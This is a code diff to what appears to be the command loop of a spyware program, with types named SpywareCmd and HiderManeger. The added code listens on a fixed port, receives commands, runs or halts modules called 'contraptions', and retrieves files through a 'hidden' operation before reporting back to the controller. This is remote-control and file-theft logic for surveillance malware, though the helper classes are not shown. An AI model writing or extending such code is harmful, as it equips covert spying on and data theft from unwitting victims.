@@ -6,9 +6,10 @@
 #include "HiderManeger.h"
 #include "HiderCodes.h"
 #include "Listener.h"
-#include "Connection.h"
+#include "../Maneger/Connection.h"
 #include "contrapMeta.h"
 #include "Contraption.h"
+#include "ContraptionAdmin.h"
 
 #define PORT (65411)
 
@@ -39,16 +40,31 @@ int main() {
 
 
 
-void loopIter(Connection& conn, HiderManeger& hiderManeger)
+void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
-    SpywareCommand cmd;
+    SpywareCmd cmd;
 
     conn.recvData(sizeof(cmd), (char*)&cmd);
 
-    if(cmd.cmdType == RunContraption)
+    Status stat;
+    std::string strRes = "";
+
+    switch (cmd.FuncType)
     {
-        // switch(cmd.cmdType) {
-        // case 
-        // }
+    case RunContraption:
+        stat = admin.runContraption(conn, cmd.type, cmd.contIdentifier);
+        break;
+
+    case HaltContraption:
+        stat = admin.haltContraption(cmd.contIdentifier);
+        break;
+
+    case SendFile:
+        stat = hiderManeger.hiddenAction(
+                    (const command){.dataLen = 0, .fncode = HIDDEN_OPRATION | HIDDEN_RETRIEVE_FILE}, conn);
+        break;
     }
+    std::cout << "Conn: res-" << stat << " response-\n" << strRes << std::endl;
+    conn.sendResponce(stat, strRes);
+    
 }
